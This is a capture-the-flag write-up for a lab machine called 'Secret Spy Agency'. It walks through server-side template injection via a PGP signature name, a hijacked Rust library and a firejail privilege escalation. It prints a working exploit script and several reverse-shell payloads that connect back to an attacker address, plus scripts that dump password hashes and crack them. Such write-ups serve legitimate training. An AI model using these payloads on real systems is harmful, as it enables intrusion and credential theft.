# INITIAL ACCESS

## DISCOVERY

Port scan revealed ports 22, 80, and 443 open.

![](screenshots/01-nmap-scan.png)

Connections to HTTP (port 80) redirected to HTTPS (port 443), which revealed the landing page of "Secret Spy Agency".

![](screenshots/02-landing-page.png)

Running `feroxbuster` revealed several directories, the `guide` one was interesting for this analysis.

![](screenshots/03-directories-found.png)

On `https://ssa.htb/guide`, it was possible to perform PGP encryption actions, including signature verification.

![](screenshots/04-guide-page.png)

The `/pgp` endpoint contained a valid hash example for demonstrating the website's "Verify Signature" functionality.

![](screenshots/05-example-hash.png)

Submitting the public hash along with the sample message resulted in a Signature Verification pop-up with information about the PGP-signed message.

![](screenshots/06-signature-verification.png)

Moreover, it was detected that the website used the Flask engine.

![](screenshots/07-flask.png)

Since Flask applications are highly susceptible to SSTI vulnerabilities, and the website reflected user input (PGP signature), one exploit hypothesis was to sign a message with a malicious signature and submit it to the website for validation.

## EXPLOIT 1 - SSTI VIA PGP SIGNATURE

In order to sign a PGP-encrypted message, `gpg` was used. The steps to reproduce the attack were the following:

|Action|Command|
|--|--|
|1. Create a message|`echo <message> > message.txt`|
|2. Generate a new key|`gpg --batch --passphrase. '' --quick-generate-key <username>`
|3. Export a public key|`gpg --export --armor > public.key`|
|4. Sign the message with the key|`gpg --clear-sign message.txt`|
|5. Submit the public key and signed message for signature verification||

![](screenshots/08-create-regular-message.png)

![](screenshots/09-regular-message-reflected.png)

Since it was confirmed that the supplied username was reflected in the website's response, it was then verified if template injection was possible. This time, the message was signed by username `{{7*7}}`, which would evaluate to `49` in case there was no sanitization in place.

![](screenshots/10-evil-message-demo.png)

![](screenshots/11-evil-message-reflected.png)


Since the template injection was confirmed, the exploit could be automated, and a payload was provided to return a reverse shell.

Exploit script:

```sh
#!/bin/bash
echo "hello" > message.txt
gpg --batch --passphrase '' --quick-generate-key "`cat ssti.txt | tr -d '\n'`"
gpg --export --armor > public.key
gpg --clear-sign message.txt

message=`cat message.txt.asc`
pubkey=`cat public.key`
r=`curl "https://ssa.htb/process" -k --data-urlencode "signed_text=$message" --data-urlencode "public_key=$pubkey"`

echo $r | grep 'Good signature from.*\[unknown\] \[GNUPG:\]' -o

rm /home/kali/.gnupg/pubring.kbx
rm message.txt.asc        
```

`ssti.txt` contents:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<your-kali-ip>\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"').read() }}
```

The shell obtained revealed that the user **atlas** was compromised. However, it is important to mention that this was a restricted environment with access to very little functionality and only basic commands allowed.

![](screenshots/12-initial-shell.png)

Reading through the files at `/home/atlas`, it was identified that `.config/httpie/sessions/localhost_5000/admin.json` contained the password for another user: **silentobserver**.

![](screenshots/13-password-found.png)

The password was valid, and an SSH session was obtained.

![](screenshots/14-second-shell.png)

# PRIVILEGE ESCALATION 1 - silentobserver TO atlas

## DISCOVERY

Enumerating the system as **silentobserver**, a couple of folders were identified in the `/opt` directory.

![](screenshots/15-opt-folder.png)

Exploring these folders revealed that the application `/opt/tipnet/target/debug/tipnet` had its SUID bit set for the **atlas** user, meaning that executing that application would perform actions under the context of **atlas**.

![](screenshots/16-tipnet-suid.png)

Moreover, the source code for the application was identified in the same folder.

![](screenshots/17-src-code.png)

Reading through the source code, it was identified that it was a Rust application, and on the first line, it called an external library named `logger`, which was under `crate`. Since the `crates` directory was in the same folder and readable, it was also possible to enumerate it.

It was then discovered that its library file, `lib.rs` was writable by **silentobserver**.

![](screenshots/18-logger-source.png)

What is more, running `pspy` to identify processes running in real-time in the server, it was noted that **atlas** was executing `tipnet` every minute or so.

![](screenshots/19-pspy.png)

This means that, with write access to `lib.rs`, it was possible to change its contents to execute arbitrary code. Once `tipnet` was executed, the arbitrary code injected in the library would be executed in the context of **atlas**.

## EXPLOIT 2 - RUST LIBRARY INJECTION

To begin with, a msfvenom reverse shell was generated and uploaded to the compromised system using SSH. The reverse shell in this context was uploaded to `/tmp/revshell.elf`.

Then, the source code of `lib.rs` was updated to the following, which would spawn a reverse shell on port 1337 of the attacker machine:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    //msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
    Command::new("/tmp/revshell.elf")
        .spawn()
        .expect("failed to execute process");
}
```

![](screenshots/20-third-shell.png)

# PRIVILEGE ESCALATION 2 - atlas TO root

## DISCOVERY

Now with an unrestricted shell as **atlas**, further enumeration was possible.

First, it was verified that **atlas** was a member of the **jailer** group.

Then, looking at the files to which **jailer** had access, it was discovered that **jailer** could execute `firejail`, which had its SUID bit set to **root**.

Furthermore, when checking `firejail` version, it detected version 0.9.68, which is vulnerable to [CVE-2022-31214](https://nvd.nist.gov/vuln/detail/CVE-2022-31214), which has a publicly available exploit leading to privilege escalation.

![](screenshots/21-firejail-enum.png)

## EXPLOIT 3 - FIREJAIL v0.9.68 PRIVILEGE ESCALATION (CVE-2022-31214)

The exploit for `firejail` was available at https://www.openwall.com/lists/oss-security/2022/06/08/10/1

However, the exploit's source code required a small alteration on line 74. Since `firejail` was not part of the `$PATH`, it was necessary to change the line to include the full path of `firejail` which was `/usr/local/bin/firejail`.

![](screenshots/22-exploit-change.png)

It's important to note that, for this exploit to work, two separate shells were needed.

Then, it was a simple matter of executing the exploit in one shell:

![](screenshots/23-exploit-shell-1.png)
And following the instructions on the second shell:

```bash
/usr/local/bin/firejail --join==<n>
su -
```

![](screenshots/24-exploit-shell-2.png)

# BEYOND ROOT

## SQL ALCHEMY

This machine had several rabbit holes. One of them was interacting with Python's SQL Alchemy. The following scripts allow for basic enumeration using SQL Alchemy.

Enumerate table names:

```python
from sqlalchemy import create_engine, inspect

engine = create_engine("mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA", echo=True)
insp = inspect(engine)
print(insp.get_table_names())
```

Basic query:

```python
from sqlalchemy import create_engine,text

engine = create_engine("mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA", echo=True)
conn = engine.connect()
query = text("select password from users")
result = conn.execute(query)
print([row[0] for row in result])
```

## WERKZEUG HASHES

Another rabbit hole from this machine was trying to crack Werkzeug hashes. These hashes have no mode available in `hashcat` or `john`. However, it has a Python library that can read and crack them incredibly fast.

Hash example: `pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f`

Here's one example of utilizing the library for cracking hashes.

```python
from werkzeug.security import check_password_hash

myhash = "pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f"
myhash = "pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d"

rockyou = open("/usr/share/wordlists/rockyou.txt","rb").read()
for pwd in rockyou:
	try:
		pwd = pwd.decode()
		pwd = pwd.rstrip()
		if check_password_hash(myhash, pwd):
			print(pwd)
			exit()
	except:
		continue
```
